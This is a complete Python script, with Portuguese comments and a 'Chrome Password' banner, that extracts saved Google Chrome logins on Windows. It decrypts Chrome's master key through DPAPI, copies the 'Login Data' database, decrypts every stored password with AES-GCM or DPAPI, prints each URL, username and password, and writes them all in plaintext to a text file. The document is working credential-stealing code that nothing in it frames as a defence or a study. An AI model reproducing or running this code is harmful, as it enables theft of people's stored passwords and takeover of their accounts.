import json
import os
import base64
import sqlite3
from shutil import copy
from Cryptodome.Cipher import AES  # PyCryptodome
import win32crypt
from colorama import Fore, Style, init

# Inicializando o colorama
init(autoreset=True)
print(Fore.LIGHTCYAN_EX + Style.BRIGHT + """
  ___  _   _  ____  _____  __  __  ____    ____    __    ___  ___  _    _  _____  ____  ____  
 / __)( )_( )(  _ \(  _  )(  \/  )( ___)  (  _ \  /__\  / __)/ __)( \/\/ )(  _  )(  _ \(  _ \ 
( (__  ) _ (  )   / )(_)(  )    (  )__)    )___/ /(__)\ \__ \\__ \ )    (  )(_)(  )   / )(_) )
 \___)(_) (_)(_)\_)(_____)(_/\/\_)(____)  (__)  (__)(__)(___/(___/(__/\__)(_____)(_)\_)(____/ 
                                                                                    
""")

def obter_chave_criptografia():
    """Recupera a chave AES usada para criptografar as senhas do Chrome"""
    caminho_local_state = os.path.join(
        os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State'
    )
    with open(caminho_local_state, 'r', encoding='utf-8') as file:
        local_state = json.load(file)
    
    chave_criptografada = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    chave_descriptografada = win32crypt.CryptUnprotectData(chave_criptografada, None, None, None, 0)[1]
    return chave_descriptografada

def descriptografar_senha(senha_criptografada, chave):
    """Descriptografa uma senha criptografada com AES GCM (Chrome v80+) ou DPAPI (versões antigas)"""
    try:
        if not senha_criptografada:
            return None
        
        # Converter memoryview para bytes, se necessário
        if isinstance(senha_criptografada, memoryview):
            senha_criptografada = senha_criptografada.tobytes()
        
        if senha_criptografada[:3] == b'v10':
            nonce = senha_criptografada[3:15]
            ciphertext = senha_criptografada[15:-16]
            tag = senha_criptografada[-16:]
            cipher = AES.new(chave, AES.MODE_GCM, nonce)
            senha_descriptografada = cipher.decrypt_and_verify(ciphertext, tag)
            return senha_descriptografada.decode('utf-8')
        else:
            senha_descriptografada = win32crypt.CryptUnprotectData(senha_criptografada, None, None, None, 0)[1]
            if senha_descriptografada:
                return senha_descriptografada.decode('utf-8')
            else:
                return None
    except Exception as e:
        print(f"Erro ao descriptografar a senha: {e}")
        return None

class Chrome:
    def __init__(self):
        self.caminho_bd = os.path.join(
            os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
        )
        self.chave = obter_chave_criptografia()

    def obter_senhas(self):
        copy(self.caminho_bd, "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        senhas = []
        for url, usuario, senha_criptografada in cursor.fetchall():
            senha = descriptografar_senha(senha_criptografada, self.chave)
            if senha:
                senhas.append({
                    'url': url,
                    'nome_usuario': usuario,
                    'senha': senha
                })
        conn.close()
        os.remove("Login Data.db")
        return senhas

    def exibir_senhas(self):
        senhas = self.obter_senhas()
        for e in senhas:
            print(Fore.LIGHTCYAN_EX + Style.BRIGHT + f"URL: {e['url']}")
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"Usuário: {e['nome_usuario']}")
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"Senha: {e['senha']}")
            print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "="*100)

    def salvar_senhas_arquivo(self, arquivo="chrome_senhas.txt"):
        senhas = self.obter_senhas()
        with open(arquivo, 'w', encoding='utf-8') as f:
            for e in senhas:
                f.write(f"URL: {e['url']}\n")
                f.write(f"Usuário: {e['nome_usuario']}\n")
                f.write(f"Senha: {e['senha']}\n")
                f.write("="*100 + "\n")
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + f"\nSenhas salvas no arquivo: {arquivo}")

def main():
    chrome = Chrome()
    chrome.exibir_senhas()
    chrome.salvar_senhas_arquivo()

if __name__ == "__main__":
    main()
    input(Fore.LIGHTRED_EX + Style.BRIGHT + "\n\nPRESSIONE ENTER PARA SAIR\n=========================\n\n")
